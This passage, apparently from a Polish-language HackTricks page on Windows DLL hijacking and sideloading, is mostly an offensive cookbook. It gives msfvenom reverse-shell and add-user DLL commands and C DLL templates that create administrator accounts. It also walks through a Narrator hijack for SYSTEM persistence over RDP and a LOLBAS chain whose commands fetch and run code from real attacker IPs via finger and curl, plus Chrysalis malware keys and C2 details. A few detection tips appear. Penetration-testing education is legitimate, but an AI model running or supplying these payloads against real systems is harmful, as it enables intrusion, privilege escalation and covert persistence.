msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Uzyskaj meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Utwórz użytkownika (dla x86 nie widziałem wersji x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Własna

W wielu przypadkach skompilowana przez Ciebie biblioteka DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozpoznać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia wątku</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Ułatwienia dostępu/ATs)

Windows Narrator.exe nadal przy uruchamianiu sprawdza przewidywalną, zależną od języka bibliotekę DLL lokalizacji, którą można przejąć, aby uzyskać arbitrary code execution i persistence.<sup>[[7]](#references)</sup>

Najważniejsze informacje
- Ścieżka sprawdzana (obecne kompilacje): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze kompilacje): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore znajduje się zapisywalna biblioteka DLL kontrolowana przez atakującego, zostanie załadowana, a `DllMain(DLL_PROCESS_ATTACH)` zostanie wykonana. Nie są wymagane żadne eksporty.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` i `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i sprawdź próbę załadowania powyższej ścieżki.

Minimalna biblioteka DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Cisza OPSEC
- Naiwny hijack spowoduje, że Narrator zacznie mówić/podświetlać elementy UI. Aby działać po cichu, po dołączeniu wylicz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Wyzwalanie i utrwalanie za pomocą konfiguracji Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Po wykonaniu powyższych czynności uruchomienie Narratora załaduje umieszczoną DLL. Na bezpiecznym pulpicie (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL zostanie wykonana jako SYSTEM na bezpiecznym pulpicie.

Uruchomienie kodu jako SYSTEM przez RDP (ruch boczny)
- Włącz klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL zostanie wykonana jako SYSTEM na bezpiecznym pulpicie.
- Wykonywanie kodu kończy się po zamknięciu sesji RDP — niezwłocznie wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia Accessibility Tool (AT) (np. CursorIndicator), edytować go tak, aby wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Pozwala to uruchamiać dowolny kod za pośrednictwem frameworka Accessibility.

Uwagi
- Zapisywanie w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Studium przypadku: CVE-2025-1729 — eskalacja uprawnień przy użyciu TPQMAssistant.exe

Ten przypadek pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajduje się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zaplanowane zadanie**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia do katalogu**: Możliwość zapisu ma `CREATOR OWNER`, co pozwala użytkownikom lokalnym umieszczać dowolne pliki.
- **Zachowanie podczas wyszukiwania DLL**: Program najpierw próbuje załadować `hostfxr.dll` z katalogu roboczego i zapisuje komunikat "NAME NOT FOUND", jeśli pliku brakuje, co wskazuje, że wyszukiwanie lokalne ma pierwszeństwo.

### Implementacja exploita

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu i wykorzystać brakującą DLL, aby uzyskać wykonanie kodu w kontekście użytkownika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Przebieg ataku

1. Jako zwykły użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli w chwili wykonania zadania zalogowany jest administrator, złośliwa DLL uruchomi się w sesji administratora na średnim poziomie integralności.
4. Połącz standardowe techniki obejścia UAC, aby uzyskać uprawnienia SYSTEM, zaczynając od średniego poziomu integralności.

## Studium przypadku: Dropper MSI CustomAction + DLL Side-Loading za pośrednictwem podpisanego hosta (wsc_proxy.exe)

Podmioty stanowiące zagrożenie często łączą droppery oparte na MSI z DLL side-loading, aby wykonywać payloady w zaufanym, podpisanym procesie.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji z GUI (np. LaunchApplication lub akcja VBScript), odtwarzając kolejny etap z osadzonych zasobów.
- Dropper zapisuje legalny, podpisany plik EXE i złośliwą DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego pliku EXE kolejność wyszukiwania DLL w Windows sprawia, że wsc.dll z katalogu roboczego zostaje załadowana jako pierwsza i wykonuje kod atakującego w podpisanym procesie nadrzędnym (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
  - Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiające w tle osadzony plik.
  - W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w pliku CAB MSI:
  - Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Możesz też użyć lessmsi: lessmsi x package.msi C:\out
  - Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction w VBScript. Typowy przebieg:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktyczne sideloading z użyciem wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
  - wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
  - wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie utwórz proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- W przypadku wymagań dotyczących exportów użyj frameworka proxyującego (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który dodatkowo wykonuje Twój payload.

- Technika ta opiera się na rozwiązywaniu nazw DLL przez host binary. Jeśli host używa ścieżek bezwzględnych lub bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność wyszukiwania i należy je uwzględnić przy wyborze host binary oraz zestawu exportów.

## Signed triads + encrypted payloads (case study ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad za pomocą **triady trzech plików**, która pozwala upodobnić się do legalnego oprogramowania, a jednocześnie przechowywać główny payload na dysku w postaci zaszyfrowanej:<sup>[[12]](#references)</sup>

1. **Podpisany host EXE** – wykorzystywane są pliki dostawców takich jak AMD, Realtek czy NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego tak, by przypominał plik binarny Windows (na przykład `conhost.exe`), ale podpis Authenticode pozostaje prawidłowy.
2. **Złośliwy loader DLL** – umieszczany obok pliku EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL to zwykle plik binarny MFC zaciemniony za pomocą frameworka ScatterBrain; jego jedynym zadaniem jest odnalezienie zaszyfrowanego bloba, odszyfrowanie go i wykonanie reflectively map ShadowPad.
3. **Zaszyfrowany blob payloadu** – często przechowywany w tym samym katalogu jako `<name>.tmp`. Po zmapowaniu odszyfrowanego payloadu w pamięci loader usuwa plik TMP, aby zatrzeć ślady forensyczne.

Uwagi dotyczące tradecraftu:

* Zmiana nazwy podpisanego pliku EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu podszywać się pod plik binarny Windows, a jednocześnie zachować podpis dostawcy. Dlatego naśladuj zwyczaj Ink Dragon polegający na umieszczaniu plików przypominających `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ plik wykonywalny pozostaje zaufany, w przypadku większości mechanizmów allowlistingu wystarczy, by złośliwa DLL znajdowała się obok niego. Skup się na dostosowaniu loader DLL; podpisany plik nadrzędny zwykle może działać bez zmian.
* Decryptor ShadowPad oczekuje, że blob TMP będzie znajdował się obok loadera i będzie zapisywalny, aby można było wyzerować plik po mapowaniu. Pozostaw katalog z prawem do zapisu do czasu załadowania payloadu; po umieszczeniu go w pamięci plik TMP można bezpiecznie usunąć, aby zachować OPSEC.

### Łańcuch sideloadingu LOLBAS stagera i staged archive (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, dzięki czemu jedynym niestandardowym artefaktem na dysku jest złośliwa DLL umieszczona obok zaufanego pliku EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je potokiem do `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, umożliwiając operatorom zmianę second stage po stronie serwera.

- **Wbudowane pobieranie i rozpakowywanie:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i umieść cel sideloadingu oraz DLL w losowym folderze `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ukrywa pasek postępu i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows narzędzia tar.

- **Uruchomienie przez WMI/CIM:** Uruchom EXE za pomocą WMI, aby telemetria wskazywała proces utworzony przez CIM, podczas gdy ładuje on DLL znajdującą się w tym samym katalogu:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Działa z binariami, które preferują lokalne DLL-e (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Wykrywanie:** Generuj alerty dla `forfiles`, gdy jednocześnie pojawiają się `/p`, `/m` i `/c`; poza skryptami administratorów takie użycie jest rzadkie.


## Studium przypadku: NSIS dropper + DLL sideloading za pomocą Bitdefender Submission Wizard (Chrysalis)

Niedawny atak Lotus Blossom nadużył zaufanego łańcucha aktualizacji, aby dostarczyć droppera spakowanego przez NSIS, który przygotowywał DLL sideloading oraz payloady działające w całości w pamięci.<sup>[[13]](#references)</sup>

Przebieg działań
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza w nim przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` i zaszyfrowany blob `BluetoothService`, a następnie uruchamia plik EXE.
- Plik host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob przez mmap; `LogWrite` odszyfrowuje go za pomocą strumienia opartego na niestandardowym LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor jawnym shellcode’em, zwalnia tymczasowe dane i wykonuje skok do niego.
- Aby uniknąć IAT, loader rozwiązuje API, haszując nazwy eksportów za pomocą **podstawy FNV-1a 0x811C9DC5 + liczby pierwszej 0x1000193**, a następnie stosując końcowe mieszanie w stylu Murmur (**0x85EBCA6B**) i porównując wynik z docelowymi hashami z solą.

Główny shellcode (Chrysalis)
- Odszyfrowuje główny moduł przypominający PE, pięciokrotnie powtarzając operacje add/XOR/sub z kluczem `gQ2JR&9;`, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza ciągi nazw DLL w czasie działania za pomocą transformacji rotacji bitów/XOR dla poszczególnych znaków, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tabelę eksportów w blokach 4-bajtowych za pomocą mieszania w stylu Murmur i używa `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Osadzona konfiguracja i C2
- Konfiguracja znajduje się w upuszczonym pliku `BluetoothService` pod **offsetem 0x30808** (rozmiar **0x980**) i jest odszyfrowywana przez RC4 za pomocą klucza `qwhvb^435h&*7`, co ujawnia URL C2 i User-Agent.
- Beacony tworzą profil hosta rozdzielany kropkami, dodają na początku tag `4Q`, a następnie szyfrują go RC4 kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane przez RC4 i kierowane za pomocą przełącznika tagów (`4T` shell, `4V` uruchomienie procesu, `4W/4X` zapis pliku, `4Y` odczyt/eksfiltracja, `4\\` odinstalowanie, `4` enumeracja dysków/plików + przypadki transferu porcjowanego).
- Tryb wykonania zależy od argumentów CLI: brak argumentów = instalacja persistence (usługa/klucz Run) wskazującej na `-i`; `-i` ponownie uruchamia proces z `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowany alternatywny loader
- W ramach tego samego ataku umieszczono Tiny C Compiler i wykonano `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, a obok znajdował się `libtcc.dll`. Dostarczony przez atakującego kod źródłowy C zawierał shellcode, który skompilowano i uruchomiono w pamięci, bez zapisywania pliku PE na dysku. Odtwórz to za pomocą:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ten oparty na TCC etap kompilacji i uruchomienia importował `Wininet.dll` w czasie działania i pobierał second-stage shellcode ze sztywno zakodowanego adresu URL, zapewniając elastyczny loader podszywający się pod uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **mechanizmy zapewniające stabilność**, dzięki którym legalny proces hosta pozostaje aktywny wystarczająco długo, aby poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej biblioteki DLL.<sup>[[11]](#references)</sup>

Zaobserwowany schemat
- Umieść zaufany plik EXE obok złośliwej biblioteki DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa biblioteka DLL **proxy’uje każdy oczekiwany eksport** do prawdziwej biblioteki DLL systemu (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal się powiedzie, a proces hosta będzie działać.
- Po załadowaniu złośliwa biblioteka DLL **modyfikuje punkt wejścia hosta**, tak aby główny wątek trafiał do nieskończonej pętli `Sleep`, zamiast kończyć działanie lub wykonywać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę biblioteki DLL kolejnego etapu (często używa się RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego to ma znaczenie
- Standardowe proxy’owanie DLL zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo, aby uruchomić kolejne etapy.
- Zawieszenie głównego wątku w `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu, podczas gdy loader wykonuje deszyfrowanie, przygotowuje kolejne etapy lub inicjuje połączenie sieciowe w wątku roboczym.
- Polowanie wyłącznie na podejrzane `DllMain` może nie wykryć tego schematu, jeśli interesujące działania następują po zmodyfikowaniu punktu wejścia hosta i uruchomieniu wątku pomocniczego.

Minimalny przebieg
1. Skopiuj podpisany plik EXE hosta i ustal, którą bibliotekę DLL ładuje z lokalnego katalogu.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą wywołania do legalnej biblioteki DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z poziomu tego wątku zmodyfikuj punkt wejścia hosta lub procedurę startową głównego wątku, aby wykonywał pętlę z `Sleep`.
5. Odszyfruj nazwę/konfigurację biblioteki DLL kolejnego etapu i wywołaj `LoadLibrary` albo ręcznie zmapuj payload.

Wskazówki dla obrońców
- Podpisane procesy ładujące `version.dll` lub podobne, powszechnie używane biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Modyfikacje pamięci w punkcie wejścia procesu krótko po załadowaniu obrazu, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które od razu wywołują `LoadLibrary` dla drugiej biblioteki DLL o odszyfrowanej nazwie.
- Proxy DLL eksportujące wszystkie funkcje, umieszczone obok plików wykonywalnych dostawców w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Wnioski z analizy zagrożeń: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – eskalacja uprawnień z użyciem TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – aplikacja UWP TPQM Assistant](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: gdy DLL hijacking spotyka się z narzędziami Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórowie: analiza ewoluujących kampanii podszywania się, które rozpowszechniają Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: analiza grup zagrożeń atakujących rząd państwa Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: sieć przekaźnikowa i kulisy skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: szczegółowa analiza zestawu narzędzi Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: łańcuch ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich z 2026 r. prowadzonych przez irańską grupę APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Szybko i wściekle: działania Nimbus Manticore podczas konfliktu z Iranem](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – działania zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 atakuje rządy i infrastrukturę krytyczną w Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
